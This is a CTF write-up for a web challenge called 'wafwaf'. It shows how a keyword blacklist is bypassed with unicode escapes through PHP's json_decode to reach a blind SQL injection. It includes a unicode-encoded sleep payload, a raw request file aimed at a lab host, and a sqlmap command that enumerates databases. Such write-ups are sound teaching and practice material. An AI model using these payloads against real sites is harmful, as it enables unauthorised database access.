# wafwaf
![Screenshot from 2021-08-17 19-41-29](https://user-images.githubusercontent.com/87865134/129727369-3ede4a39-cf71-4373-85ff-1cc49e07807d.png)

## Analysis
- we have blacklist 
```
[, (, *, <, =, >, |, ', &, -, @, ], select, and, or, if, by, from, where, as, is, in, not, having
```
- use `json_decode` => can use **unicode** to bypass blacklist
- `php://input`  is a read-only stream that allows you to read raw data from the request body
```php
$db->query("SELECT note FROM notes WHERE assignee = '%s'", $obj->user);
```
> Maybe SQLi

# Exploit
- Test SQLi:
  - change `' or sleep(15) #` to unicode utf-16
  ```
  \u0027 \u006f\u0072 \u0073\u006c\u0065\u0065\u0070\u0028\u0031\u0035\u0029 \u0023
  ```
  - use Burpsuite repeat request
  
![Screenshot from 2021-08-17 20-22-20](https://user-images.githubusercontent.com/87865134/129733348-18e2023c-29e0-4ec3-83c0-76bd937da74c.png)

  > Response delays about 15 sec => Blind SQLi

- Use `sqlmap` to exploit:
  - create file `request.txt`:
  ```
  POST / HTTP/1.1
  Host: 139.59.166.56:31053
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate
  Connection: close
  Upgrade-Insecure-Requests: 1
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 100

  {
    "user": "payload*"
  }

  ```
  - run `sqlmap` to list all database:
  ```
  sqlmap -r request.txt -tamper charunicodeescape --thread=10  --dbs --technique=T  
  ```
  
  
  ## - Description
  > **category**: SQL injection
  
